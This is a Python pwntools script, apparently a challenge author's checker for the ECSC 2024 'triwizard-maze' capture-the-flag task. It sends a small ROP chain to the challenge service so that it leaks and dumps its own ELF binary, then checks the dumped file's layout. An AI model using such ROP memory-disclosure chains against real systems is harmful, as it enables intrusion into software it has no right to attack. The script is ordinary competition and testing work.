#!/usr/bin/env python3
#
# @mebeim - 2024-05-17
#

import os
import sys
from operator import itemgetter
from tempfile import NamedTemporaryFile
from subprocess import run, PIPE

from pwn import remote, process, args, context, flat, log, ELF


HOST = os.getenv('HOST', 'triwizard-maze.challs.external.open.ecsc2024.it')
PORT = int(os.getenv('PORT', 36999))

ROP_CHAIN_LENGTH = 1024


def connect():
	with context.local(log_level='error'):
		if args.REMOTE:
			return remote(HOST, PORT)
		elif args.LOCAL:
			return remote('localhost', PORT)
		return process('./build/triwizard-maze', env={'FLAG': 'CCIT{test}'})


def dump_elf() -> bytes:
	r = connect()
	r.recvuntil(b'print(const void *buf, size_t n) is at ')

	print_fn = int(r.recvline(), 0)
	base = print_fn & ~0xffff
	log.info('print_fn @ %#x', print_fn)
	log.info('base @ %#x', base)

	chain = flat(print_fn, 0, base, 0x10000)
	r.sendlineafter(b'):\n', chain.ljust(ROP_CHAIN_LENGTH, b'\0'))

	with context.local(log_level='error'):
		elf = r.recvall()
		r.close()

	return elf


def main() -> int:
	context(arch='i386')

	elf = dump_elf()

	with NamedTemporaryFile('wb') as f:
		log.info('Got %#x bytes, writing to %s', len(elf), f.name)
		f.write(elf)
		f.flush()

		p = run(['readelf', '-lhS', f.name], stdout=PIPE, stderr=PIPE, text=True)

		# Check that readelf does not bark at us for bad offsets or similar stuff
		if 'readelf: Warning:' in p.stderr or 'readelf: Error:' in p.stderr:
			log.failure('Something looks broken!')
			print('===[readelf stdout]'.ljust(80, '='))
			print(p.stdout)
			print('===[readelf stderr]'.ljust(80, '='))
			print(p.stderr)
			return 1

		try:
			# Check that we can load the ELF with pwntools and that all the
			# sections we expect are present
			exe = ELF(f.name)

			# Ensure ELF base is where we want it (set in Makefile)
			assert exe.address == 0x13370000

			# Ensure .text is where we want it (set in Makefile) and that
			# virtual offset == file offset
			sec = exe.get_section_by_name('.text')
			foff, voff = sec['sh_offset'], sec['sh_addr'] - exe.address
			assert voff == 0x1000, f'.text has bad virtual offset: {voff:#x}'
			assert foff == voff, f'.text has bad offset: file {foff:#x} vs virtual {voff:#x}'

			# Ensure .bss has enough space to write random stuff
			sec = exe.get_section_by_name('.bss')
			assert sec['sh_size'] > 0x100, '.bss too small!'

			# Ensure no holes between segments
			phs = sorted(exe.iter_segments_by_type('LOAD'), key=itemgetter('p_vaddr'))
			prev_end = None

			for i, ph in enumerate(phs):
				va = ph['p_vaddr']
				sz = ph['p_memsz']
				align = ph['p_align']

				va_start = va & ~0xfff
				if prev_end is not None:
					assert va_start == prev_end, f'hole between section {i -1 } and {i}!'

				va_end = va + sz
				if va_end % align:
					va_end = va_end + (align - va_end % align)

				prev_end = va_end
		except Exception as e:
			log.failure('ELF validation failed!')
			print(f'{e.__class__.__name__}: {e}')
			return 1

	log.success('ELF looks good!')
	return 0


if __name__ == '__main__':
	sys.exit(main())
